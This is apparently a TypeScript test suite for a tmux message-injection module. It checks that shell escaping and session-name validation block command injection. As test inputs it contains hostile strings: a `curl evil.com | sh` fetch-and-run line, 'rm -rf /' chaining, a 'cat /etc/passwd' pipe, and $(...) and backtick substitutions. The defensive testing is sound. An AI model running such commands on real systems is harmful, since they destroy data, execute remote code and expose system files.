/**
 * Tests for the direct injection module (Layer 1: raw tmux).
 *
 * Tests command builders and escaping logic. Execution tests mock
 * child_process since they depend on tmux being available.
 */

import { describe, test, expect } from 'bun:test';

import {
  buildInjectCommand,
  buildPeekCommand,
  escapeForTmux,
  validateSessionTarget,
} from '../inject';
import type { InjectOptions, PeekOptions } from '../inject';

// ---------------------------------------------------------------------------
// escapeForTmux -- security-critical, thorough coverage
// ---------------------------------------------------------------------------

describe('escapeForTmux', () => {
  test('passes simple alphanumeric strings through', () => {
    expect(escapeForTmux('hello world')).toBe('hello world');
  });

  test('passes numbers through', () => {
    expect(escapeForTmux('test 123')).toBe('test 123');
  });

  test('escapes single quotes', () => {
    expect(escapeForTmux("it's")).toBe("it'\\''s");
  });

  test('escapes multiple single quotes', () => {
    expect(escapeForTmux("it's a 'test'")).toBe("it'\\''s a '\\''test'\\''");
  });

  test('escapes backslashes', () => {
    expect(escapeForTmux('path\\to\\file')).toBe('path\\\\to\\\\file');
  });

  test('escapes dollar signs to prevent variable expansion', () => {
    expect(escapeForTmux('$HOME')).toBe('\\$HOME');
  });

  test('escapes backticks to prevent command substitution', () => {
    expect(escapeForTmux('`whoami`')).toBe('\\`whoami\\`');
  });

  test('escapes exclamation marks (history expansion)', () => {
    expect(escapeForTmux('hello!')).toBe('hello\\!');
  });

  test('escapes semicolons to prevent command chaining', () => {
    expect(escapeForTmux('hello; rm -rf /')).toBe('hello\\; rm -rf /');
  });

  test('escapes pipes to prevent piping', () => {
    expect(escapeForTmux('hello | cat /etc/passwd')).toBe('hello \\| cat /etc/passwd');
  });

  test('escapes ampersands to prevent backgrounding', () => {
    expect(escapeForTmux('cmd & evil')).toBe('cmd \\& evil');
  });

  test('escapes parentheses to prevent subshells', () => {
    expect(escapeForTmux('$(evil)')).toBe('\\$\\(evil\\)');
  });

  test('escapes double quotes', () => {
    expect(escapeForTmux('say "hello"')).toBe('say \\"hello\\"');
  });

  test('handles empty string', () => {
    expect(escapeForTmux('')).toBe('');
  });

  test('handles string with only special chars', () => {
    const result = escapeForTmux('$`!;|&');
    expect(result).not.toContain('$`');
    expect(result).toContain('\\$');
    expect(result).toContain('\\`');
  });

  test('handles newlines', () => {
    expect(escapeForTmux('line1\nline2')).toBe('line1\\nline2');
  });

  test('handles carriage returns', () => {
    expect(escapeForTmux('line1\rline2')).toBe('line1\\rline2');
  });

  test('handles tab characters', () => {
    expect(escapeForTmux('col1\tcol2')).toBe('col1\\tcol2');
  });

  test('combined attack vector: command injection attempt', () => {
    const attack = "'; rm -rf / #";
    const escaped = escapeForTmux(attack);
    // Single quote is escaped, semicolon is escaped -- no shell breakout
    expect(escaped).toContain("'\\''");
    expect(escaped).toContain('\\;');
    // No unescaped semicolon (every ; is preceded by \)
    expect(escaped).not.toMatch(/[^\\];/);
  });

  test('combined attack vector: backtick injection', () => {
    const attack = '`curl evil.com | sh`';
    const escaped = escapeForTmux(attack);
    expect(escaped).toContain('\\`');
    expect(escaped).toContain('\\|');
  });
});

// ---------------------------------------------------------------------------
// validateSessionTarget
// ---------------------------------------------------------------------------

describe('validateSessionTarget', () => {
  test('accepts valid session names', () => {
    expect(validateSessionTarget('my-session')).toBe(true);
    expect(validateSessionTarget('session_1')).toBe(true);
    expect(validateSessionTarget('agent.alpha')).toBe(true);
    expect(validateSessionTarget('CamelCase')).toBe(true);
    expect(validateSessionTarget('0starts-with-number')).toBe(true);
  });

  test('rejects empty string', () => {
    expect(validateSessionTarget('')).toBe(false);
  });

  test('rejects strings with semicolons (command injection)', () => {
    expect(validateSessionTarget('sess; rm -rf /')).toBe(false);
  });

  test('rejects strings with backticks', () => {
    expect(validateSessionTarget('sess`evil`')).toBe(false);
  });

  test('rejects strings with dollar signs', () => {
    expect(validateSessionTarget('$sess')).toBe(false);
  });

  test('rejects strings with pipes', () => {
    expect(validateSessionTarget('sess|evil')).toBe(false);
  });

  test('rejects strings with ampersands', () => {
    expect(validateSessionTarget('sess&evil')).toBe(false);
  });

  test('rejects strings with parentheses', () => {
    expect(validateSessionTarget('$(evil)')).toBe(false);
  });

  test('rejects strings with spaces', () => {
    expect(validateSessionTarget('my session')).toBe(false);
  });

  test('rejects strings with newlines', () => {
    expect(validateSessionTarget('sess\nevil')).toBe(false);
  });

  test('rejects strings with quotes', () => {
    expect(validateSessionTarget("sess'evil")).toBe(false);
    expect(validateSessionTarget('sess"evil')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// buildInjectCommand
// ---------------------------------------------------------------------------

describe('buildInjectCommand', () => {
  test('builds correct tmux send-keys command', () => {
    const cmd = buildInjectCommand('my-session', 'hello');
    expect(cmd).toEqual(['tmux', 'send-keys', '-t', 'my-session', 'hello', 'Enter']);
  });

  test('escapes special characters in message', () => {
    const cmd = buildInjectCommand('sess', "it's $HOME");
    const messageArg = cmd[4]!;
    expect(messageArg).toContain('\\$HOME');
    expect(messageArg).toContain("'\\''");
  });

  test('supports noEnter option', () => {
    const cmd = buildInjectCommand('sess', 'hello', { noEnter: true });
    expect(cmd).toEqual(['tmux', 'send-keys', '-t', 'sess', 'hello']);
    expect(cmd).not.toContain('Enter');
  });

  test('throws on empty session name', () => {
    expect(() => buildInjectCommand('', 'hello')).toThrow('Invalid session target');
  });

  test('throws on session name with injection characters', () => {
    expect(() => buildInjectCommand('sess; evil', 'hello')).toThrow('Invalid session target');
  });

  test('throws on empty message', () => {
    expect(() => buildInjectCommand('sess', '')).toThrow('Message cannot be empty');
  });

  test('supports pane target syntax', () => {
    const cmd = buildInjectCommand('sess:0.1', 'hello');
    expect(cmd[3]).toBe('sess:0.1');
  });
});

// ---------------------------------------------------------------------------
// buildPeekCommand
// ---------------------------------------------------------------------------

describe('buildPeekCommand', () => {
  test('builds correct tmux capture-pane command', () => {
    const cmd = buildPeekCommand('my-session');
    expect(cmd).toEqual(['tmux', 'capture-pane', '-t', 'my-session', '-p']);
  });

  test('supports lines option', () => {
    const cmd = buildPeekCommand('sess', { lines: 20 });
    expect(cmd).toContain('-S');
    expect(cmd).toContain('-20');
  });

  test('supports startLine option', () => {
    const cmd = buildPeekCommand('sess', { startLine: -50 });
    expect(cmd).toContain('-S');
    expect(cmd).toContain('-50');
  });

  test('throws on empty session name', () => {
    expect(() => buildPeekCommand('')).toThrow('Invalid session target');
  });

  test('throws on session name with injection characters', () => {
    expect(() => buildPeekCommand('sess`evil`')).toThrow('Invalid session target');
  });

  test('supports pane target syntax', () => {
    const cmd = buildPeekCommand('sess:0.1');
    expect(cmd[3]).toBe('sess:0.1');
  });

  test('validates lines is positive integer', () => {
    expect(() => buildPeekCommand('sess', { lines: -5 })).toThrow('lines must be a positive integer');
    expect(() => buildPeekCommand('sess', { lines: 0 })).toThrow('lines must be a positive integer');
    expect(() => buildPeekCommand('sess', { lines: 1.5 })).toThrow('lines must be a positive integer');
  });
});
